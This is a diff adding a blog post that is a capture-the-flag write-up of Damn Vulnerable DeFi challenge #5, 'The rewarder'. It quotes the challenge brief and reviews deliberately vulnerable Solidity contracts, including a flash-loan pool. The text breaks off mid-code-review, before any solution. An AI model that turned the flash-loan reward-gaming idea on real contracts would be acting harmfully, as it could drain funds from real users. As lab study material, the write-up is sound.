@@ -1,0 +1,845 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>Damn Vulnerable DeFi - Challenge #5 - The rewarder - della&#39;s blog</title><meta name="Description" content="della&#39;s blog"><meta property="og:title" content="Damn Vulnerable DeFi - Challenge #5 - The rewarder" />
+<meta property="og:description" content="Solution for &ldquo;Damn Vulnerable DeFi - Challenge #5 - The rewarder&rdquo;." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://dellalibera.github.io/posts/damnvulnerabledefi_05_the-rewarder/" /><meta property="og:image" content="https://dellalibera.github.io"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-08-11T00:00:00+00:00" />
+<meta property="article:modified_time" content="2022-08-11T00:00:00+00:00" /><meta property="og:site_name" content="della&#39;s blog" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://dellalibera.github.io"/>
+
+<meta name="twitter:title" content="Damn Vulnerable DeFi - Challenge #5 - The rewarder"/>
+<meta name="twitter:description" content="Solution for &ldquo;Damn Vulnerable DeFi - Challenge #5 - The rewarder&rdquo;."/>
+<meta name="application-name" content="della&#39;s blog">
+<meta name="apple-mobile-web-app-title" content="della&#39;s blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://dellalibera.github.io/posts/damnvulnerabledefi_05_the-rewarder/" /><link rel="next" href="https://dellalibera.github.io/posts/damnvulnerabledefi_01_unstoppable/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Damn Vulnerable DeFi - Challenge #5 - The rewarder",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/dellalibera.github.io\/posts\/damnvulnerabledefi_05_the-rewarder\/"
+        },"genre": "posts","keywords": "Damn Vulnerable DeFi, CTF, Solidity, Blockchain","wordcount":  2325 ,
+        "url": "https:\/\/dellalibera.github.io\/posts\/damnvulnerabledefi_05_the-rewarder\/","datePublished": "2022-08-11T00:00:00+00:00","dateModified": "2022-08-11T00:00:00+00:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "della"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('light' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'light' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="della&#39;s blog">della&#39;s blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/"> Home </a><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/advisories/"> Advisories </a><a class="menu-item" href="/about/"> About </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="della&#39;s blog">della&#39;s blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><a class="menu-item" href="/" title="">Home</a><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/advisories/" title="">Advisories</a><a class="menu-item" href="/about/" title="">About</a></div>
+    </div>
+</header><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title">Damn Vulnerable DeFi - Challenge #5 - The rewarder</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://dellalibera.github.io/about/" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>della</a></span>&nbsp;<span class="post-category">included in <a href="/categories/writeup/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Writeup</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="August 11, 2022">August 11, 2022</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;2325 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;11 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#1-challenge">1) Challenge</a></li>
+    <li><a href="#2-code-review">2) Code Review</a>
+      <ul>
+        <li><a href="#21-accountingtokensol">2.1) <code>AccountingToken.sol</code></a></li>
+        <li><a href="#22-flashloanerpoolsol">2.2) <code>FlashLoanerPool.sol</code></a></li>
+        <li><a href="#23-rewardtokensol">2.3) <code>RewardToken.sol</code></a></li>
+        <li><a href="#24-therewarderpoolsol">2.4) <code>TheRewarderPool.sol</code></a></li>
+      </ul>
+    </li>
+    <li><a href="#3-solution">3) Solution</a></li>
+    <li><a href="#4-references">4) References</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><div id="id-1">Solution for &ldquo;Damn Vulnerable DeFi - Challenge #5 - The rewarder&rdquo;.</div>
+<h2 id="1-challenge">1) Challenge</h2>
+<div class="details admonition quote open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-quote-right fa-fw" aria-hidden="true"></i>Description<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><p>There&rsquo;s a pool offering rewards in tokens every 5 days for those who deposit their DVT tokens into it.</p>
+<p>Alice, Bob, Charlie and David have already deposited some DVT tokens, and have won their rewards!</p>
+<p>You don&rsquo;t have any DVT tokens. But in the upcoming round, you must claim most rewards for yourself.</p>
+<p>Oh, by the way, rumours say a new pool has just landed on mainnet. Isn&rsquo;t it offering DVT tokens in flash loans? (<a href="https://www.damnvulnerabledefi.xyz/challenges/5.html" target="_blank" rel="noopener noreffer ">link</a>)</p>
+</div>
+        </div>
+    </div>
+<p>Challenge created by <a href="https://twitter.com/tinchoabbate" target="_blank" rel="noopener noreffer ">@tinchoabbate</a>.</p>
+<h2 id="2-code-review">2) Code Review</h2>
+<p>In this challenge there are <code>4</code> contracts: <code>AccountingToken.sol</code>, <code>FlashLoanerPool.sol</code>, <code>RewardToken.sol</code> and <code>TheRewarderPool.sol</code>.</p>
+<h3 id="21-accountingtokensol">2.1) <code>AccountingToken.sol</code></h3>
+<p>This is an <code>ERC-20</code> contract with snapshots functionalities (<a href="https://github.com/tinchoabbate/damn-vulnerable-defi/blob/master/contracts/the-rewarder/AccountingToken.sol" target="_blank" rel="noopener noreffer ">source code</a>). It inherits from <a href="https://docs.openzeppelin.com/contracts/3.x/api/token/erc20#ERC20Snapshot" target="_blank" rel="noopener noreffer ">ERC20Snapshot</a>. When created, it sets the creator of the contract with roles <code>DEFAULT_ADMIN_ROLE</code>, <code>MINTER_ROLE</code>, <code>SNAPSHOT_ROLE</code> and <code>BURNER_ROLE</code> (lines <code>21-24</code>) . These roles are then used to check if the sender has the rigth permissions to call the contract functions. For example, only the sender with role <code>MINTER_ROLE</code> can execute the <code>mint</code> function (line <code>28</code>). The <code>_mint</code> function <em>&ldquo;creates amount tokens and assigns them to account, increasing the total supply</em> (doc <a href="https://docs.openzeppelin.com/contracts/3.x/api/token/erc20#ERC20-_mint-address-uint256-" target="_blank" rel="noopener noreffer ">here</a>).</p>
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">47
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">48
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">49
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">50
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">51
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#00f">contract</span> <span style="color:#000">AccountingToken</span> <span style="color:#00f">is</span> <span style="color:#000">ERC20Snapshot</span>, <span style="color:#000">AccessControl</span> {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">bytes32</span> <span style="color:#00f">public</span> <span style="color:#00f">constant</span> <span style="color:#000">MINTER_ROLE</span> = <span style="color:#000">keccak256</span>(<span style="color:#5a2">&#34;MINTER_ROLE&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">bytes32</span> <span style="color:#00f">public</span> <span style="color:#00f">constant</span> <span style="color:#000">SNAPSHOT_ROLE</span> = <span style="color:#000">keccak256</span>(<span style="color:#5a2">&#34;SNAPSHOT_ROLE&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">bytes32</span> <span style="color:#00f">public</span> <span style="color:#00f">constant</span> <span style="color:#000">BURNER_ROLE</span> = <span style="color:#000">keccak256</span>(<span style="color:#5a2">&#34;BURNER_ROLE&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">constructor</span>() <span style="color:#000">ERC20</span>(<span style="color:#5a2">&#34;rToken&#34;</span>, <span style="color:#5a2">&#34;rTKN&#34;</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#000">_setupRole</span>(<span style="color:#000">DEFAULT_ADMIN_ROLE</span>, <span style="color:#000">msg</span>.<span style="color:#000">sender</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#000">_setupRole</span>(<span style="color:#000">MINTER_ROLE</span>, <span style="color:#000">msg</span>.<span style="color:#000">sender</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#000">_setupRole</span>(<span style="color:#000">SNAPSHOT_ROLE</span>, <span style="color:#000">msg</span>.<span style="color:#000">sender</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#000">_setupRole</span>(<span style="color:#000">BURNER_ROLE</span>, <span style="color:#000">msg</span>.<span style="color:#000">sender</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">function</span> <span style="color:#000">mint</span>(<span style="color:#00f">address</span> <span style="color:#000">to</span>, <span style="color:#00f">uint256</span> <span style="color:#000">amount</span>) <span style="color:#00f">external</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#000">require</span>(<span style="color:#000">hasRole</span>(<span style="color:#000">MINTER_ROLE</span>, <span style="color:#000">msg</span>.<span style="color:#000">sender</span>), <span style="color:#5a2">&#34;Forbidden&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#000">_mint</span>(<span style="color:#000">to</span>, <span style="color:#000">amount</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">function</span> <span style="color:#000">burn</span>(<span style="color:#00f">address</span> <span style="color:#00f">from</span>, <span style="color:#00f">uint256</span> <span style="color:#000">amount</span>) <span style="color:#00f">external</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#000">require</span>(<span style="color:#000">hasRole</span>(<span style="color:#000">BURNER_ROLE</span>, <span style="color:#000">msg</span>.<span style="color:#000">sender</span>), <span style="color:#5a2">&#34;Forbidden&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#000">_burn</span>(<span style="color:#00f">from</span>, <span style="color:#000">amount</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">function</span> <span style="color:#000">snapshot</span>() <span style="color:#00f">external</span> <span style="color:#00f">returns</span> (<span style="color:#00f">uint256</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#000">require</span>(<span style="color:#000">hasRole</span>(<span style="color:#000">SNAPSHOT_ROLE</span>, <span style="color:#000">msg</span>.<span style="color:#000">sender</span>), <span style="color:#5a2">&#34;Forbidden&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">return</span> <span style="color:#000">_snapshot</span>();
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#888;font-style:italic">// Do not need transfer of this token
+</span></span></span><span style="display:flex;"><span><span style="color:#888;font-style:italic"></span>    <span style="color:#00f">function</span> <span style="color:#000">_transfer</span>(<span style="color:#00f">address</span>, <span style="color:#00f">address</span>, <span style="color:#00f">uint256</span>) <span style="color:#00f">internal</span> <span style="color:#00f">pure</span> <span style="color:#00f">override</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#000">revert</span>(<span style="color:#5a2">&#34;Not implemented&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#888;font-style:italic">// Do not need allowance of this token
+</span></span></span><span style="display:flex;"><span><span style="color:#888;font-style:italic"></span>    <span style="color:#00f">function</span> <span style="color:#000">_approve</span>(<span style="color:#00f">address</span>, <span style="color:#00f">address</span>, <span style="color:#00f">uint256</span>) <span style="color:#00f">internal</span> <span style="color:#00f">pure</span> <span style="color:#00f">override</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#000">revert</span>(<span style="color:#5a2">&#34;Not implemented&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}</span></span></code></pre></td></tr></table>
+</div>
+</div>
+<h3 id="22-flashloanerpoolsol">2.2) <code>FlashLoanerPool.sol</code></h3>
+<p>This contract (<a href="https://github.com/tinchoabbate/damn-vulnerable-defi/blob/master/contracts/the-rewarder/FlashLoanerPool.sol" target="_blank" rel="noopener noreffer ">source code</a>) is responsible for providing flash loans via the <code>flashLoan</code> function:</p>
+<ul>
+<li>it prevents reintrancy by using the <code>nonReentrant</code> modifier from <a href="https://docs.openzeppelin.com/contracts/4.x/api/security#ReentrancyGuard" target="_blank" rel="noopener noreffer ">ReentrancyGuard</a></li>
+<li>checks if the <code>DVT</code> balance of the pool is <code>&gt;=</code> than the amount requested (line <code>27</code>)</li>
+<li>checks if sender is a deployed contract (line <code>29</code>)</li>
+<li>transfer the amount to the sender (line <code>31</code>)</li>
+<li>calls the <code>receiveFlashLoan</code> function of the sender contract (line <code>33</code>)</li>
+<li>finally, it checks if the amount is paid it back (line <code>40</code>)</li>
+</ul>
+<p>Since there is a check at line <code>29</code>, it means we need to call this function from a contract we control.</p>
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#00f">contract</span> <span style="color:#000">FlashLoanerPool</span> <span style="color:#00f">is</span> <span style="color:#000">ReentrancyGuard</span> {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">using</span> <span style="color:#000">Address</span> <span style="color:#00f">for</span> <span style="color:#00f">address</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#000">DamnValuableToken</span> <span style="color:#00f">public</span> <span style="color:#00f">immutable</span> <span style="color:#000">liquidityToken</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">constructor</span>(<span style="color:#00f">address</span> <span style="color:#000">liquidityTokenAddress</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#000">liquidityToken</span> = <span style="color:#000">DamnValuableToken</span>(<span style="color:#000">liquidityTokenAddress</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">function</span> <span style="color:#000">flashLoan</span>(<span style="color:#00f">uint256</span> <span style="color:#000">amount</span>) <span style="color:#00f">external</span> <span style="color:#000">nonReentrant</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">uint256</span> <span style="color:#000">balanceBefore</span> = <span style="color:#000">liquidityToken</span>.<span style="color:#000">balanceOf</span>(<span style="color:#00f">address</span>(<span style="color:#000">this</span>));
+</span></span><span style="display:flex;"><span>        <span style="color:#000">require</span>(<span style="color:#000">amount</span> &lt;= <span style="color:#000">balanceBefore</span>, <span style="color:#5a2">&#34;Not enough token balance&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#000">require</span>(<span style="color:#000">msg</span>.<span style="color:#000">sender</span>.<span style="color:#000">isContract</span>(), <span style="color:#5a2">&#34;Borrower must be a deployed contract&#34;</span>);
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#000">liquidityToken</span>.<span style="color:#000">transfer</span>(<span style="color:#000">msg</span>.<span style="color:#000">sender</span>, <span style="color:#000">amount</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#000">msg</span>.<span style="color:#000">sender</span>.<span style="color:#000">functionCall</span>(
+</span></span><span style="display:flex;"><span>            <span style="color:#000">abi</span>.<span style="color:#000">encodeWithSignature</span>(
+</span></span><span style="display:flex;"><span>                <span style="color:#5a2">&#34;receiveFlashLoan(uint256)&#34;</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#000">amount</span>
+</span></span><span style="display:flex;"><span>            )
+</span></span><span style="display:flex;"><span>        );
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#000">require</span>(<span style="color:#000">liquidityToken</span>.<span style="color:#000">balanceOf</span>(<span style="color:#00f">address</span>(<span style="color:#000">this</span>)) &gt;= <span style="color:#000">balanceBefore</span>, <span style="color:#5a2">&#34;Flash loan not paid back&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}</span></span></code></pre></td></tr></table>
+</div>
+</div>
+<h3 id="23-rewardtokensol">2.3) <code>RewardToken.sol</code></h3>
+<p>This contract (<a href="https://github.com/tinchoabbate/damn-vulnerable-defi/blob/master/contracts/the-rewarder/RewardToken.sol" target="_blank" rel="noopener noreffer ">source code</a>) represent the reward token (ERC-20 token) distributed to those who have deposited some <code>DVT</code> tokens. Like the <code>AccountingToken.sol</code> cotract, it sets the <code>DEFAULT_ADMIN_ROLE</code> and <code>MINTER_ROLE</code> to the creator of the contract (lines <code>18-19</code>) and checks that only senders with role <code>MINTER_ROLE</code> can execute the <code>mint</code> function (line <code>23</code>).</p>
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
